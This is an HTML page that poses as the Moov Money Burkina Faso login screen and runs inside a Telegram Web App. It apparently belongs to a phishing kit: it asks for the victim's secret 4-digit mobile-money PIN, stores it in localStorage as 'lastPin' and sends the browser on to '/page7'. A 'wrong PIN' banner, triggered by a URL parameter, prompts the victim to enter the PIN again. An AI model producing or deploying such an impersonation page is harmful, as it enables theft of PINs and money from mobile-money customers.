<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money Burkina Faso - Connexion</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root { 
            --moov-orange: #ff6600; 
            --moov-blue: #0044cc; 
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { 
            background-color: #f0f4f8; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
        }
        .card { 
            background: #fff; 
            width: 90%; 
            max-width: 400px; 
            padding: 35px 24px; 
            border-radius: 20px; 
            box-shadow: 0 4px 20px rgba(0,68,204,0.08); 
        }
        h2 { 
            text-align: center; 
            color: var(--moov-blue); 
            margin-top: 0; 
            font-size: 24px; 
            font-weight: 800; 
        }
        .subtext {
            text-align: center; 
            font-size: 14px; 
            color: #666; 
            margin-bottom: 24px;
        }
        
        /* 4-Box PIN Container */
        .pin-container { 
            display: flex; 
            justify-content: center; 
            gap: 12px; 
            margin: 25px 0 30px; 
        }
        .pin-box { 
            width: 55px; 
            height: 60px; 
            border: 2px solid #cbd5e1; 
            border-radius: 12px; 
            text-align: center; 
            font-size: 24px; 
            font-weight: 800; 
            outline: none; 
            transition: border-color 0.2s, box-shadow 0.2s;
            -webkit-text-security: disc; /* Masks digits with dots */
        }
        .pin-box:focus {
            border-color: var(--moov-blue);
            box-shadow: 0 0 0 3px rgba(0, 68, 204, 0.15);
        }

        .btn-submit { 
            width: 100%; 
            background-color: #cbd5e1; 
            color: #fff; 
            border: none; 
            padding: 16px; 
            border-radius: 10px; 
            font-size: 16px; 
            font-weight: 800; 
            cursor: not-allowed; 
            text-transform: uppercase; 
            transition: background-color 0.2s;
        }
        .btn-submit.active {
            background-color: var(--moov-orange);
            cursor: pointer;
        }

        .error-banner { 
            background: #fee2e2; 
            color: #dc2626; 
            border: 1px solid #fecaca; 
            padding: 12px; 
            border-radius: 8px; 
            font-size: 13.5px; 
            margin-bottom: 20px; 
            text-align: center; 
            font-weight: 600; 
            display: none; 
        }
    </style>
</head>
<body>

<div class="card">
    <h2>Connexion Moov Money</h2>
    <p class="subtext">Entrez votre code PIN secret à 4 chiffres pour accéder à votre compte.</p>

    <div id="errorBanner" class="error-banner">Code PIN incorrect. Veuillez réessayer.</div>

    <form id="loginForm" onsubmit="handleLogin(event)">
        <div class="pin-container">
            <input type="password" inputmode="numeric" maxlength="1" class="pin-box" autocomplete="off" pattern="[0-9]*" required>
            <input type="password" inputmode="numeric" maxlength="1" class="pin-box" autocomplete="off" pattern="[0-9]*" required>
            <input type="password" inputmode="numeric" maxlength="1" class="pin-box" autocomplete="off" pattern="[0-9]*" required>
            <input type="password" inputmode="numeric" maxlength="1" class="pin-box" autocomplete="off" pattern="[0-9]*" required>
        </div>

        <button type="submit" id="submitBtn" class="btn-submit" disabled>Se Connecter</button>
    </form>
</div>

<script>
    document.addEventListener("DOMContentLoaded", () => {
        if (window.Telegram?.WebApp) { 
            window.Telegram.WebApp.ready(); 
            window.Telegram.WebApp.expand(); 
        }

        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('error') === 'wrongpin') {
            document.getElementById('errorBanner').style.display = 'block';
        }

        const pinBoxes = document.querySelectorAll('.pin-box');
        const submitBtn = document.getElementById('submitBtn');

        // Focus first box automatically
        pinBoxes[0].focus();

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                // Keep only numeric input
                box.value = box.value.replace(/[^0-9]/g, '');

                if (box.value && index < pinBoxes.length - 1) {
                    pinBoxes[index + 1].focus();
                }

                checkPinCompletion();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && !box.value && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        function checkPinCompletion() {
            const fullPin = Array.from(pinBoxes).map(b => b.value).join('');
            const isComplete = fullPin.length === 4;
            
            submitBtn.disabled = !isComplete;
            submitBtn.classList.toggle('active', isComplete);
        }
    });

    function handleLogin(event) {
        event.preventDefault();
        const pinBoxes = document.querySelectorAll('.pin-box');
        const pin = Array.from(pinBoxes).map(b => b.value).join('');

        if (pin.length === 4) {
            localStorage.setItem('lastPin', pin);
            window.location.href = "/page7";
        }
    }
</script>
</body>
</html>
